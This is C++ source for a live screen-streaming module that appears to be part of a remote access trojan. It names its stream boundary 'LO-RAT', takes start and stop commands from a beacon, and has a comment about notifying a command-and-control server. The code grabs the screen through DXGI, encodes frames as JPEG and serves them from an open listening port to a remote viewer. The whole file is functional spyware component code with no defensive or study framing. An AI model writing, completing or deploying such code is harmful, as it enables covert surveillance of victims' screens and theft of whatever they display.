#include "live_screen.h"
#include "../config.h"
#include "../dxgi_capture.h"
#include <windows.h>
#include <gdiplus.h>
#include <cstdlib>
#include <sstream>
#include <winsock2.h>
#include <vector>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

namespace LiveScreen {
    bool streaming = false;
    HANDLE hThread = NULL;
    SOCKET listenSocket = INVALID_SOCKET;
    int port = 0;
    int quality = 80;
    int fps = 15;
    ULONG_PTR gdiToken = 0;

    static int GetJpegEncoderClsid(CLSID* clsid) {
        UINT num = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return -1;
        auto codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
        Gdiplus::GetImageEncoders(num, size, codecs);
        for (UINT i = 0; i < num; i++) {
            if (wcscmp(codecs[i].MimeType, L"image/jpeg") == 0) {
                *clsid = codecs[i].Clsid;
                free(codecs);
                return 0;
            }
        }
        free(codecs);
        return -1;
    }

    static std::vector<BYTE> BgraToJpeg(const BYTE* bgra, int w, int h, int q) {
        Gdiplus::Bitmap bmp(w, h, w * 4, PixelFormat32bppRGB, (BYTE*)bgra);
        CLSID clsid;
        GetJpegEncoderClsid(&clsid);
        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid = Gdiplus::EncoderQuality;
        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        ULONG ql = q;
        params.Parameter[0].Value = &ql;

        IStream* stream = nullptr;
        CreateStreamOnHGlobal(nullptr, TRUE, &stream);
        bmp.Save(stream, &clsid, &params);

        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        LARGE_INTEGER zero = {};
        stream->Seek(zero, STREAM_SEEK_SET, nullptr);

        std::vector<BYTE> data(stat.cbSize.LowPart);
        ULONG read = 0;
        stream->Read(data.data(), (ULONG)data.size(), &read);
        stream->Release();
        return data;
    }

    DWORD WINAPI StreamThread(LPVOID param) {
        DXGICapture capture;
        if (!capture.Init()) {
            streaming = false;
            return 1;
        }

        if (!gdiToken) {
            Gdiplus::GdiplusStartupInput input;
            Gdiplus::GdiplusStartup(&gdiToken, &input, nullptr);
        }

        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = 0;

        bind(listenSocket, (sockaddr*)&addr, sizeof(addr));

        sockaddr_in boundAddr;
        int addrLen = sizeof(boundAddr);
        getsockname(listenSocket, (sockaddr*)&boundAddr, &addrLen);
        port = ntohs(boundAddr.sin_port);

        listen(listenSocket, 1);
        SOCKET client = accept(listenSocket, nullptr, nullptr);
        if (client == INVALID_SOCKET) {
            capture.Release();
            closesocket(listenSocket);
            WSACleanup();
            streaming = false;
            return 1;
        }

        std::string header =
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: multipart/x-mixed-replace; boundary=--LO-RAT\r\n"
            "\r\n";
        send(client, header.c_str(), (int)header.size(), 0);

        int intervalMs = 1000 / fps;

        while (streaming) {
            std::vector<BYTE> bgra;
            int w = 0, h = 0;
            if (!capture.CaptureFrame(bgra, w, h)) {
                Sleep(intervalMs);
                continue;
            }

            auto jpeg = BgraToJpeg(bgra.data(), w, h, quality);
            if (jpeg.empty()) break;

            std::string mime =
                "--LO-RAT\r\n"
                "Content-Type: image/jpeg\r\n"
                "Content-Length: " + std::to_string(jpeg.size()) + "\r\n\r\n";

            send(client, mime.c_str(), (int)mime.size(), 0);
            send(client, (char*)jpeg.data(), (int)jpeg.size(), 0);
            send(client, "\r\n", 2, 0);

            Sleep(intervalMs);
        }

        capture.Release();
        closesocket(client);
        closesocket(listenSocket);
        WSACleanup();
        streaming = false;
        return 0;
    }

    void Start(const std::string& params) {
        if (streaming) return;

        if (!gdiToken) {
            Gdiplus::GdiplusStartupInput input;
            Gdiplus::GdiplusStartup(&gdiToken, &input, nullptr);
        }

        quality = SCREEN_QUALITY;
        fps = SCREEN_FPS;

        streaming = true;
        hThread = CreateThread(nullptr, 0, StreamThread, nullptr, 0, nullptr);

        Sleep(500);

        std::stringstream ss;
        ss << "{\"action\":\"live_screen\",\"port\":" << port << "}";
        // C2 notification (would go through beacon)
    }

    void Stop() {
        streaming = false;
        if (listenSocket != INVALID_SOCKET) {
            closesocket(listenSocket);
            listenSocket = INVALID_SOCKET;
        }
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            hThread = nullptr;
        }
    }

    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "live_screen_start") Start(cmd.params);
        else if (cmd.type == "live_screen_stop") Stop();
    }

    bool IsStreaming() { return streaming; }
    int GetPort() { return port; }
}
